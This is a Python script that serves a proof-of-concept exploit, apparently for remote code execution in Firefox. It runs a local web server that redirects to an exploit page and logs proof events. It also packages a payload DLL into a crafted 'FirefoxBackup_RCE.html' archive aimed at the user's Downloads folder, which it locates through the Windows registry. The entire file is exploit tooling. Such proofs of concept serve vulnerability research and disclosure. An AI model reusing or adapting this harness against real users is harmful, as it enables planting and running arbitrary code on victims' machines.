from __future__ import annotations

import argparse
import json
import os
from datetime import datetime, timezone
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, quote, unquote, urlsplit

from build_backup import build_archive, build_zip


ENTRY_BASE = "/exploit.html"
DOWNLOADS_KNOWN_FOLDER_ID = "{374DE290-123F-4565-9164-39C4925E467B}"


def get_downloads_directory() -> Path:
    if os.name == "nt":
        try:
            import winreg

            key_path = (
                r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
            )
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                value, _ = winreg.QueryValueEx(key, DOWNLOADS_KNOWN_FOLDER_ID)
            return Path(os.path.expandvars(value)).resolve()
        except (OSError, ValueError):
            pass
    return (Path.home() / "Downloads").resolve()


class PocHandler(SimpleHTTPRequestHandler):
    proof_log: Path
    entry_path: str

    def do_GET(self) -> None:
        parsed = urlsplit(self.path)
        if parsed.path == "/":
            self.send_response(302)
            self.send_header("Location", self.entry_path)
            self.end_headers()
            return
        if parsed.path == "/favicon.ico":
            self.send_response(204)
            self.end_headers()
            return
        if parsed.path.startswith("/__proof__/"):
            event = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": unquote(parsed.path.removeprefix("/__proof__/")),
                "query": {
                    key: values for key, values in parse_qs(parsed.query).items()
                },
                "client": self.client_address[0],
            }
            with self.proof_log.open("a", encoding="utf-8") as stream:
                stream.write(json.dumps(event, separators=(",", ":")) + "\n")
            print(json.dumps(event, separators=(",", ":")), flush=True)
            self.send_response(204)
            self.end_headers()
            return
        super().do_GET()

    def end_headers(self) -> None:
        self.send_header("Cache-Control", "no-store")
        super().end_headers()


def prepare_archive(directory: Path, downloads_directory: Path) -> tuple[Path, Path]:
    dll_path = directory / "firefox_calc_payload.dll"
    archive_path = directory / "FirefoxBackup_RCE.html"
    if not dll_path.is_file():
        raise SystemExit(f"missing payload DLL: {dll_path}")
    downloaded_dll_path = downloads_directory / dll_path.name
    downloaded_backup_path = downloads_directory / archive_path.name
    existing = [path for path in (downloaded_dll_path, downloaded_backup_path) if path.exists()]
    if existing:
        rendered = "\n".join(str(path) for path in existing)
        raise SystemExit(f"remove these existing files before starting:\n{rendered}")
    archive_path.write_bytes(
        build_archive(build_zip(dll_path, str(downloaded_dll_path)))
    )
    return archive_path, downloaded_backup_path


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--bind", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8896)
    parser.add_argument(
        "--directory", type=Path, default=Path(__file__).resolve().parent
    )
    parser.add_argument("--proof-log", type=Path)
    args = parser.parse_args()
    directory = args.directory.resolve()
    proof_log = (args.proof_log or directory / "proof.jsonl").resolve()
    proof_log.parent.mkdir(parents=True, exist_ok=True)
    downloads_directory = get_downloads_directory()
    archive_path, downloaded_backup_path = prepare_archive(
        directory, downloads_directory
    )
    entry_path = ENTRY_BASE + "?backupfile=" + quote(
        str(downloaded_backup_path), safe=""
    )
    PocHandler.proof_log = proof_log
    PocHandler.entry_path = entry_path
    handler = partial(PocHandler, directory=str(directory))
    print(f"archive={archive_path}", flush=True)
    print(f"visit=http://{args.bind}:{args.port}/", flush=True)
    print(f"proof_log={proof_log}", flush=True)
    with ThreadingHTTPServer((args.bind, args.port), handler) as server:
        server.serve_forever()


if __name__ == "__main__":
    main()
